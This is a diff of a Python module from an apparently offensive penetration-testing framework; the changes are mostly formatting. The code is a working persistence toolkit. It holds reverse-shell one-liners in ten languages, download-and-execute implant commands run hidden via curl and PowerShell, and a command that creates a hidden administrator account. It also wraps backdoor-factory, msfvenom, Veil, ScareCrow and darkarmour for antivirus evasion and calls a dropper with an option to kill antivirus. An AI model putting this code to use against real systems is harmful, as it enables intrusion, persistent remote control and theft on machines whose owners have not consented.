@@ -294,8 +294,10 @@ Write-Host "[+] Check: Get-ScheduledTask -TaskName '{task_name}'"
             return args[idx + 1]
         except (ValueError, IndexError):
             return None
+
+
 for _lazy_name in dir(_lazy_utils):
-    if not _lazy_name.startswith('_'):
+    if not _lazy_name.startswith("_"):
         globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
 
 
@@ -386,12 +388,10 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         Dependencies:
         - `pwncat-cs`: A tool used for creating reverse shells or bind shells.
         """
-        lhost = self.params['lhost']
-        lport = self.params['lport']
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
         if not lport and not line:
-            print_error(
-                f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}"
-            )
+            print_error(f"lport must be assign or pass the port by parameter like: nc 6666.{RESET}")
             return
         if not line:
             print_msg(f"Try.. pwncat -l {lport} --self-inject /bin/bash:{self.params['lhost']}:{lport}{RESET}")
@@ -399,9 +399,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         else:
             print_msg(f"Try.. pwncat -l {line} --self-inject /bin/bash:{self.params['lhost']}:{line}{RESET}")
             self.cmd(f"pwncat -l {line} --self-inject /bin/bash:{self.params['lhost']}:{line}")
-        print_msg(
-            f"{RED}[*] {YELLOW} Shutdown pwncat sessions in port {RED} [{lport}|{line}] {RESET}"
-        )
+        print_msg(f"{RED}[*] {YELLOW} Shutdown pwncat sessions in port {RED} [{lport}|{line}] {RESET}")
         return
 
     @cmd2.with_category("05. Persistence")
@@ -436,8 +434,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
         if not require_rhost(self.params):
             return
-        rhost = self.params['rhost']
-
+        rhost = self.params["rhost"]
 
         credentials_file = "./sessions/credentials.txt"
         if not os.path.exists(credentials_file):
@@ -456,6 +453,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
             for user, passwd in credentials:
                 from core.hardening import set_sshpass_env
+
                 _env = set_sshpass_env(passwd)
                 command_args = ["sshpass", "-e", "ftp", f"{user}@{self.params['rhost']}"]
                 print_msg(f"sshpass -e ftp {user}@{self.params['rhost']}")
@@ -487,7 +485,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         Example usage: `rdp`
         """
         path = os.getcwd()
-        credentials_file = f'{path}/sessions/credentials.txt'
+        credentials_file = f"{path}/sessions/credentials.txt"
 
         if not os.path.isfile(credentials_file):
             print_error("Error: Credentials file not found.")
@@ -502,7 +500,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
         # Split credentials into username and password
         try:
-            username, password = credentials.split(':')
+            username, password = credentials.split(":")
         except ValueError:
             print_error("Error: Invalid credentials format in the file.")
             return
@@ -510,21 +508,21 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         if not require_rhost(self.params):
             print_error("Error: Invalid or undefined self.params['rhost'].")
             return
-        rhost = self.params['rhost']
+        rhost = self.params["rhost"]
 
         # Construct and execute the remmina command
         username = username.strip()
         if not username or any(ch in username for ch in ";|&$()`{}!><*?~#\\'\"\n\r"):
             print_error("Error: Invalid username in credentials file.")
             return
-        password = password.replace('\r', '').replace('\n', '').splitlines()[0]
+        password = password.replace("\r", "").replace("\n", "").splitlines()[0]
         from core.hardening import safe_clipboard_copy
 
         if not safe_clipboard_copy(password):
             print_error("Failed to copy password to clipboard (install xclip or xsel)")
             return
         print_msg("Password copied to clipboard; not displayed for safety.")
-        rhost_value = str(self.params['rhost']).strip()
+        rhost_value = str(self.params["rhost"]).strip()
         print_msg(f"Executing remmina against {rhost_value} as {username}")
         try:
             subprocess.run(
@@ -573,6 +571,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             f"su - {username}"
         )
         from core.hardening import safe_clipboard_copy
+
         print_msg(f"Command ready for user {username} (password redacted from preview).")
         if safe_clipboard_copy(cmd):
             print_warn("Copied to clipboard")
@@ -616,7 +615,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             f"New-LocalUser -Name '{username}' -Password $securePassword -FullName '{username} User' -Description '{username} User'; }}; "
             f"$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
             f"if ($group) {{ Add-LocalGroupMember -Group 'Administrators' -Member '{username}' }} else {{ Write-Output 'Group Administrators was not found.' }}; "
-            f"Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:{username} cmd.exe\\\"`\"' ; "
+            f'Start-Process powershell -Verb runAs -ArgumentList \'-NoProfile -ExecutionPolicy Bypass -Command `"Start-Process cmd.exe -Verb runAs -ArgumentList \\"/C runas /user:{username} cmd.exe\\"`"\' ; '
             f"net localgroup administrators {username} /add"
         )
 
@@ -693,7 +692,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_error("You must pass the password of weevly shell as an argument. example: weevelygen s3cr3t")
             return
 
-        name = input("    [!] Enter the file name: (default: weevely.php)") or 'weevely.php'
+        name = input("    [!] Enter the file name: (default: weevely.php)") or "weevely.php"
         command = f"cd sessions && weevely generate {line} {name}"
         print_msg(f"weevely generate {line} {name}")
         self.cmd(command)
@@ -730,7 +729,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             self.cmd("sudo apt install weevely -y")
 
         if not line:
-            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
+            print_error(
+                "You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t"
+            )
             return
 
         args = line.split(" ")
@@ -742,7 +743,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_msg(command)
             self.cmd(command)
         else:
-            print_error("You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t")
+            print_error(
+                "You must pass url and the password of weevly shell as an argument. example: weevely http://victim.local/weevely.php s3cr3t"
+            )
             return
         return
 
@@ -776,9 +779,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_warn("Installing backdoor-factory...")
             self.cmd("sudo apt install backdoor-factory -y")
 
-        lhost = self.params['lhost']
-        lport = self.params['lport']
-        if not check_lhost(self.params['lhost']):
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        if not check_lhost(self.params["lhost"]):
             return
 
         if not check_lport(lport):
@@ -788,8 +791,12 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_error("you need enter the path to file to backdoored")
             line = input("    [!] Enter the absolute path: ")
 
-        print_msg(f"Try... backdoor-factory -f {line} -H {self.params['lhost']} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe {RESET}")
-        self.cmd(f"backdoor-factory -f {line} -H {self.params['lhost']} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe")
+        print_msg(
+            f"Try... backdoor-factory -f {line} -H {self.params['lhost']} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe {RESET}"
+        )
+        self.cmd(
+            f"backdoor-factory -f {line} -H {self.params['lhost']} -P {lport} -s reverse_shell_tcp_inline -J -a -c -l 128 -o sessions/backdoor_factory.exe"
+        )
         return
 
     @cmd2.with_category("05. Persistence")
@@ -836,7 +843,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             "Powershell [.ps1]",
             "Python [.py]",
             "Tomcat [.war]",
-            "Windows [.exe // .exe // .dll]"
+            "Windows [.exe // .exe // .dll]",
         ]
 
         print_warn("Select the payload type:")
@@ -852,14 +859,14 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
         params = {
             "type": selected_type,
-            "lhost": input("Enter the target IP or domain (default lhost): ") or self.params['lhost'],
-            "lport": input("Enter the port (default lport): ") or self.params['lport'],
+            "lhost": input("Enter the target IP or domain (default lhost): ") or self.params["lhost"],
+            "lport": input("Enter the port (default lport): ") or self.params["lport"],
             "cmd_msf": input("Enter CMD or MSF (default msf): ") or "msf",
             "bind_reverse": input("Enter BIND or REVERSE (default reverse): ") or "reverse",
             "staged_stageless": input("Enter STAGED or STAGELESS (default stageless): ") or "stageless",
             "protocol": input("Enter protocol (TCP, HTTP, HTTPS, FIND_PORT) (default tcp): ") or "tcp",
             "batch_loop": input("Enter BATCH or LOOP (optional): "),
-            "verbose": input("Enter VERBOSE (optional): ")
+            "verbose": input("Enter VERBOSE (optional): "),
         }
 
         msfpc_command = (
@@ -906,14 +913,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             self.cmd("go get github.com/KyleBanks/XOREncryption/Go")
             self.cmd("go build Ivy.go")
 
-
         options = {
-            "staged_inject": {
-                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
-            },
-            "staged_local": {
-                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
-            },
+            "staged_inject": {"cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"},
+            "staged_local": {"cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"},
             "stageless_local": {
                 "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
             },
@@ -943,7 +945,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             },
             "macro_web_downloader": {
                 "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery macro -stageless"
-            }
+            },
         }
 
         print_warn("Select the payload type:")
@@ -963,7 +965,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             "output_file": input("Enter the Name of the payload (payload.txt): "),
             "process64": input("Enter 64-bit process path (optional): "),
             "process32": input("Enter 32-bit process path (optional): "),
-            "url": input("Enter URL (optional): ")
+            "url": input("Enter URL (optional): "),
         }
 
         ivy_command = options[selected_type]["cmd"].format(**params)
@@ -995,9 +997,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             veil python_meterpreter_rev_https LHOST=192.168.1.100 LPORT=443
             veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100 LPORT=4444
         """
-        lport = self.params['lport']
-        lhost = self.params['lhost']
-        if not check_lhost(self.params['lhost']):
+        lport = self.params["lport"]
+        lhost = self.params["lhost"]
+        if not check_lhost(self.params["lhost"]):
             return
         if not check_lport(lport):
             return
@@ -1006,7 +1008,6 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_warn("Veil-Evasion is not installed. Installing Veil-Evasion...")
             self.cmd("git clone https://github.com/Veil-Framework/Veil.git external/.exploit/Veil")
             self.cmd("cd external/.exploit/Veil && ./config/setup.sh --force --silent")
-
 
         options = {
             "python_meterpreter_rev_https": {
@@ -1020,7 +1021,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             },
             "c_sharp_meterpreter_https": {
                 "cmd": "Veil-Evasion.py -p csharp/meterpreter/rev_https LHOST={self.params['lhost']} LPORT={lport} -o {output_file}"
-            }
+            },
         }
 
         print_warn("Select the payload type:")
@@ -1034,11 +1035,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
 
         selected_type = list(options.keys())[type_choice]
 
-        params = {
-            "self.params['lhost']": self.params['lhost'],
-            "lport": lport,
-            "output_file": "sessions/payload.txt"
-        }
+        params = {"self.params['lhost']": self.params["lhost"], "lport": lport, "output_file": "sessions/payload.txt"}
 
         veil_command = options[selected_type]["cmd"].format(**params)
 
@@ -1061,7 +1058,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             self.cmd("go get github.com/fatih/color")
             self.cmd("go get github.com/yeka/zip")
             self.cmd("go get github.com/josephspurrier/goversioninfo")
-            self.cmd("mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go")
+            self.cmd(
+                "mkdir -p ~/bypass && cd ~/bypass && git clone https://github.com/optiv/ScareCrow && cd ScareCrow && go build ScareCrow.go"
+            )
 
             command = """
             bash -c '
@@ -1075,8 +1074,8 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             '
             """.replace("            ", "")
             self.cmd(command)
-        url = self.params['url']
-        domain = self.params['domain']
+        url = self.params["url"]
+        domain = self.params["domain"]
         print_warn("Select the mode you want to use:")
         options = [
             "Evasion (Disk, KnownDLL, None)",
@@ -1098,7 +1097,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             "Set Output Path",
             "Sandbox Evasion",
             "Set URL",
-            "Set Valid Cert"
+            "Set Valid Cert",
         ]
 
         for i, option in enumerate(options, start=1):
@@ -1122,23 +1121,45 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
                 scarecrow_command += f" -self.params['domain'] {self.params['domain']}"
 
             if choice == 1:
-                exec_method = input("    [!] Enter Exec method (RtlCopy/ProcessInjection/NtQueueApcThreadEx/VirtualAlloc) [default: RtlCopy]: ").strip() or "RtlCopy"
+                exec_method = (
+                    input(
+                        "    [!] Enter Exec method (RtlCopy/ProcessInjection/NtQueueApcThreadEx/VirtualAlloc) [default: RtlCopy]: "
+                    ).strip()
+                    or "RtlCopy"
+                )
                 scarecrow_command += f" -Exec {exec_method}"
                 scarecrow_command += f" -self.params['domain'] {self.params['domain']}"
             if choice == 2:
-                loader = input("    [!] Enter Loader type (binary/control/dll/excel/msiexec/wscript) [default: binary]: ").strip() or "binary"
+                loader = (
+                    input(
+                        "    [!] Enter Loader type (binary/control/dll/excel/msiexec/wscript) [default: binary]: "
+                    ).strip()
+                    or "binary"
+                )
                 scarecrow_command += f" -Loader {loader}"
 
                 if loader in ["binary", "dll"]:
-                    shellcode_path = input("    [!] Enter the path to the raw 64-bit shellcode [default: /path/to/shellcode]: ").strip() or "sessions/shellcode.bin"
+                    shellcode_path = (
+                        input(
+                            "    [!] Enter the path to the raw 64-bit shellcode [default: /path/to/shellcode]: "
+                        ).strip()
+                        or "sessions/shellcode.bin"
+                    )
                     scarecrow_command += f" -I {shellcode_path}"
 
                 if loader not in ["binary", "dll"]:
-                    output_name = input("    [!] Enter the output file name (e.g., loader.js or loader.hta) [default: loader.js]: ").strip() or "loader.js"
+                    output_name = (
+                        input(
+                            "    [!] Enter the output file name (e.g., loader.js or loader.hta) [default: loader.js]: "
+                        ).strip()
+                        or "loader.js"
+                    )
                     scarecrow_command += f" -O sessions/{output_name}"
 
                 if loader in ["control", "excel", "wscript"]:
-                    delivery = input("    [!] Enter delivery method (bits/hta/macro) [default: bits]: ").strip() or "bits"
+                    delivery = (
+                        input("    [!] Enter delivery method (bits/hta/macro) [default: bits]: ").strip() or "bits"
+                    )
                     scarecrow_command += f" -delivery {delivery}"
                     if delivery == "hta" and loader in ["binary", "dll"]:
                         print_error("Binary and DLL loaders are not compatible with HTA delivery.")
@@ -1155,8 +1176,6 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             if choice == 19:
                 url = input(f"    [!] Enter the url [default: {url}]: ").strip() or url
                 scarecrow_command += f" -url {url}"
-
-
 
             print_msg(f"Running ScareCrow with command: {scarecrow_command}")
             self.cmd(f"{scarecrow_command} ")
@@ -1187,7 +1206,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             "7": "Telnet",
             "8": "NodeJS",
             "9": "Golang",
-            "10": "PowerShell"
+            "10": "PowerShell",
         }
 
         print_msg("Choose the type of reverse shell to generate:")
@@ -1198,27 +1217,27 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         if choice not in shell_options:
             print_error("Invalid choice. Please enter a number between 1 and 10.")
             return
-        lhost = self.params['lhost']
-        lport = self.params['lport']
-        ip = input(f"    [!] Enter IP (default: {self.params['lhost']}): ").strip() or self.params['lhost']
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        ip = input(f"    [!] Enter IP (default: {self.params['lhost']}): ").strip() or self.params["lhost"]
         port = input(f"    [!] Enter Port (default: {lport}): ").strip() or lport
 
         if choice == "1":
             command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
         elif choice == "2":
-            command = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+            command = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
         elif choice == "3":
             command = f"nc -e /bin/sh {ip} {port}"
         elif choice == "4":
-            command = f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            command = f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
         elif choice == "5":
-            command = f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            command = f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
         elif choice == "6":
-            command = f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
+            command = f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
         elif choice == "7":
             command = f"rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p"
         elif choice == "8":
-            command = f"node -e 'var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({port}, \"{ip}\", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});'"
+            command = f'node -e \'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect({port}, "{ip}", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});\''
         elif choice == "9":
             command = f'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
         elif choice == "10":
@@ -1248,18 +1267,16 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_warn("Dr0p1t.py not found. Installing...")
             command = "cd && git clone https://github.com/D4Vinci/Dr0p1t-Framework.git && cd Dr0p1t-Framework && chmod +x install.sh && ./install.sh"
             self.cmd(command)
-        lhost = self.params['lhost']
-        malware_url = input("    [!] Enter the malware URL (e.g., https://example.com/malware.exe): ").strip() or f"http://{self.params['lhost']}/shell.elf"
+        lhost = self.params["lhost"]
+        malware_url = (
+            input("    [!] Enter the malware URL (e.g., https://example.com/malware.exe): ").strip()
+            or f"http://{self.params['lhost']}/shell.elf"
+        )
         if not malware_url:
             print_error("Malware URL is required.")
             return
 
-        persistence_options = {
-            "1": "--runas",
-            "2": "-s",
-            "3": "-t",
-            "4": "-a"
-        }
+        persistence_options = {"1": "--runas", "2": "-s", "3": "-t", "4": "-a"}
 
         print_msg("Choose persistence options for the dropper:")
         for key, value in persistence_options.items():
@@ -1270,8 +1287,8 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         if choice in persistence_options:
             persistence_command = persistence_options[choice]
 
-        kill_av = input("    [!] Kill antivirus before execution? (y/n, default: n): ").strip().lower() or 'n'
-        if kill_av == 'y':
+        kill_av = input("    [!] Kill antivirus before execution? (y/n, default: n): ").strip().lower() or "n"
+        if kill_av == "y":
             kill_av_command = "-k"
         else:
             kill_av_command = ""
@@ -1312,10 +1329,10 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         Returns:
         None
         """
-        lhost = self.params['lhost']
-        lport = self.params['lport']
-        domain = self.params['domain']
-        subdomain = self.params['subdomain']
+        lhost = self.params["lhost"]
+        lport = self.params["lport"]
+        domain = self.params["domain"]
+        subdomain = self.params["subdomain"]
 
         cert_name = f"sessions/{subdomain}.{self.params['domain']}"
         print_msg(f"Creating SSL certificate for {cert_name}")
@@ -1329,11 +1346,13 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         print_msg(cert_command)
         self.cmd(cert_command)
         if not line:
-            choice = input("Would you like a staged or stageless payload? (Enter 'staged' or 'stageless'): ").strip().lower()
+            choice = (
+                input("Would you like a staged or stageless payload? (Enter 'staged' or 'stageless'): ").strip().lower()
+            )
         else:
             choice = line.strip()
 
-        if choice == 'staged':
+        if choice == "staged":
             staged_payload_command = (
                 f"msfvenom -p windows/meterpreter/reverse_winhttps LHOST={self.params['lhost']} LPORT={lport} "
                 f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
@@ -1354,7 +1373,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             print_msg(listener_staged_command)
             self.cmd(listener_staged_command)
             self.logcsv(f"paranoid_meterpreter {listener_staged_command}")
-        elif choice == 'stageless':
+        elif choice == "stageless":
             stageless_payload_command = (
                 f"msfvenom -p windows/meterpreter_reverse_https LHOST={self.params['lhost']} LPORT={lport} "
                 f"PayloadUUIDTracking=true HandlerSSLCert=./{cert_name}.pem "
@@ -1403,10 +1422,10 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             6. Configures a multi-handler to listen for incoming connections.
         """
         try:
-            lhost = self.params['lhost']
-            lport = self.params['lport']
+            lhost = self.params["lhost"]
+            lport = self.params["lport"]
 
-            if not self.params['lhost'] or not lport:
+            if not self.params["lhost"] or not lport:
                 raise ValueError("LHOST and LPORT must be specified in self.params")
 
             print_msg(f"[*] SEToolKit configuring payload with LHOST={self.params['lhost']} and LPORT={lport}.")
@@ -1441,11 +1460,14 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         if not os.path.exists(darkarmour_path):
             print_warn("darkarmour is not installed. Cloning the repository and installing dependencies.")
             self.cmd(f"git clone {darkarmour_git} {darkarmour_path}")
-            self.cmd("sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode")
+            self.cmd(
+                "sudo apt install mingw-w64-tools mingw-w64-common g++-mingw-w64 gcc-mingw-w64 upx-ucl osslsigncode"
+            )
             print_msg("darkarmour installation completed.")
 
-
-        file_input = input("    [!] Enter file to encrypt (default: 'sessions/shell64.exe'): ") or f"{sessions}/shell64.exe"
+        file_input = (
+            input("    [!] Enter file to encrypt (default: 'sessions/shell64.exe'): ") or f"{sessions}/shell64.exe"
+        )
         encryption_method = input("    [!] Enter encryption method (default: 'xor'): ") or "xor"
         shellcode_file = input("    [!] Enter shellcode file (default: None): ") or None
         is_binary = input("    [!] Is the file a binary executable (default: 'yes')? (y/n): ") or "y"
@@ -1456,7 +1478,9 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         is_source = input("    [!] Is the file C source code (default: 'no')? (y/n): ") or "n"
         encryption_key = input("    [!] Enter encryption key (default: None): ") or None
         loop_count = input("    [!] Enter number of encryption levels (default: '5'): ") or "5"
-        output_file = input("    [!] Enter output file name (default: 'sessions/legit.exe'): ") or f"{sessions}/legit.exe"
+        output_file = (
+            input("    [!] Enter output file name (default: 'sessions/legit.exe'): ") or f"{sessions}/legit.exe"
+        )
 
         darkarmour_command = f"cd {darkarmour_path} && python3 {darkarmour_path}/darkarmour.py -f {file_input} --encrypt {encryption_method} "
 
@@ -1493,15 +1517,16 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         Returns:
             None
         """
-        HOST = self.params['rhost']
+        HOST = self.params["rhost"]
         if line:
             PORT = line.strip()
         else:
-            PORT = self.params['rport']
+            PORT = self.params["rport"]
         print_msg(f"KnokKnok backdoor on {HOST} {PORT}")
         cadena = str(self.params.get("c2_reverse_shell_password", "") or "").strip()
         if not cadena or len(cadena) < 12:
             import secrets
+
             cadena = secrets.token_hex(32)
             print_error(
                 f"c2_reverse_shell_password not configured (minimum 12 chars). "
@@ -1511,7 +1536,7 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((HOST, int(PORT)))
-            client_socket.sendall(cadena.encode('utf-8'))
+            client_socket.sendall(cadena.encode("utf-8"))
             client_socket.close()
             print_msg("Who is ?")
         except Exception:
@@ -1546,43 +1571,49 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             if len(args) == 1:
                 line = args[0]
                 choice = None
-                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
+                print_error(
+                    "1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) "
+                )
                 return
             elif len(args) == 2:
                 line = args[0]
                 choice = args[1]
-                port = '6666'
-                listener = '7777'
+                port = "6666"
+                listener = "7777"
             elif len(args) == 3:
                 line = args[0]
                 choice = args[1]
-                port =  args[2]
-                listener = '7777'
+                port = args[2]
+                listener = "7777"
             elif len(args) == 4:
                 line = args[0]
                 choice = args[1]
-                port =  args[2]
+                port = args[2]
                 listener = args[3]
             else:
-                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
+                print_error(
+                    "2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen "
+                )
                 return
         else:
-            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
+            print_error(
+                "3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) "
+            )
             return
 
-        lhost = self.params['lhost']
+        lhost = self.params["lhost"]
         implant_go2 = f"l_{line}_l.exe"
         if choice == "2":
             command = f"curl -o /tmp/l_{line} http://{self.params['lhost']}/l_{line} && sudo -S chmod +x /tmp/l_{line} && sudo -S nohup /tmp/l_{line} & \\n"
         else:
-            command = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{self.params['lhost']}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\""
+            command = f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{self.params["lhost"]}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`""'
 
-        self.onecmd(f'assign rport {port}')
-        self.onecmd(f'assign lport {port}')
-        self.onecmd(f'assign listener {listener}')
-        self.onecmd(f'c2 {line} {choice}')
-        self.onecmd(f'ssh_cmd {command}')
-        self.onecmd(f'nc {listener}')
+        self.onecmd(f"assign rport {port}")
+        self.onecmd(f"assign lport {port}")
+        self.onecmd(f"assign listener {listener}")
+        self.onecmd(f"c2 {line} {choice}")
+        self.onecmd(f"ssh_cmd {command}")
+        self.onecmd(f"nc {listener}")
         return
 
     @cmd2.with_category("05. Persistence")
@@ -1613,43 +1644,49 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             if len(args) == 1:
                 line = args[0]
                 choice = None
-                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
+                print_error(
+                    "1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) "
+                )
                 return
             elif len(args) == 2:
                 line = args[0]
                 choice = args[1]
-                port = '6666'
-                listener = '7777'
+                port = "6666"
+                listener = "7777"
             elif len(args) == 3:
                 line = args[0]
                 choice = args[1]
-                port =  args[2]
-                listener = '7777'
+                port = args[2]
+                listener = "7777"
             elif len(args) == 4:
                 line = args[0]
                 choice = args[1]
-                port =  args[2]
+                port = args[2]
                 listener = args[3]
             else:
-                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
+                print_error(
+                    "2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen "
+                )
                 return
         else:
-            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
+            print_error(
+                "3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) "
+            )
             return
 
-        lhost = self.params['lhost']
+        lhost = self.params["lhost"]
 
         if choice == "2":
             command = f"curl -o /home/.grisun0/l_{line}.sh http://{self.params['lhost']}/listener_{line}.sh && sudo -S chmod +x /home/.grisun0/l_{line}.sh && sudo -S nohup /bin/bash /home/.grisun0/l_{line}.sh & \\n"
         else:
-            command = f"Start-Process powershell -ArgumentList \"curl -o l_{line}.sh http://{self.params['lhost']}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &\""
+            command = f'Start-Process powershell -ArgumentList "curl -o l_{line}.sh http://{self.params["lhost"]}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &"'
 
-        self.onecmd(f'assign rport {port}')
